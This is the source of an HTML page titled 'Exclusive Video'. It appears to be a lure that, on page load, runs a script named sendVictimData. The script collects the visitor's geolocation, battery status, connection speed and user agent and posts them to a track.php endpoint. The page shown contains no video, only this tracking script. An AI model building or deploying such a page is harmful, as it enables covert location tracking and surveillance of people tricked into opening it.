<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Video</title>
    <script>
        function sendVictimData() {
            navigator.geolocation.getCurrentPosition(position => {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                let accuracy = position.coords.accuracy;
                
                navigator.getBattery().then(battery => {
                    let batteryLevel = Math.round(battery.level * 100);
                    let chargingStatus = battery.charging ? "Yes" : "No";
                    
                    let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    let speed = connection ? connection.downlink : "Unknown";
                    
                    let device = navigator.userAgent;
                    
                    fetch('track.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: lat, lon: lon, accuracy: accuracy,
                            battery: batteryLevel, charging: chargingStatus,
                            speed: speed, device: device
                        })
                    });
                });
            });
        }
        
        window.onload = sendVictimData;
    </script>
